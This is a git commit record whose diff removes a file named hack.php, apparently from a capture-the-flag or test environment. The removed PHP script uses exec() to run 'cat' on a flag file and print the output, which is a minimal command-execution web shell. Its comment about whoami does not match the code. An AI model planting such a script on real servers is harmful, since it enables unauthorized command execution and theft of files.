ef8be7cb1d78aafde211b389cb7c1d42a6b4ec0f
TYeung <scyeungaf@connect.ust.hk>
2024-04-07 01:33:46 +0800

    remove hack.php for testing

--- hack.php
+++
@@ -1,9 +0,0 @@
-<?php
-// outputs the username that owns the running php/httpd process
-// (on a system with the "whoami" executable in the path)
-$output=null;
-$retval=null;
-exec('cat /flag-e3deebb27b56053dd7041cf93d1499f4', $output, $retval);
-print_r($output);
-print($retval);
-?>
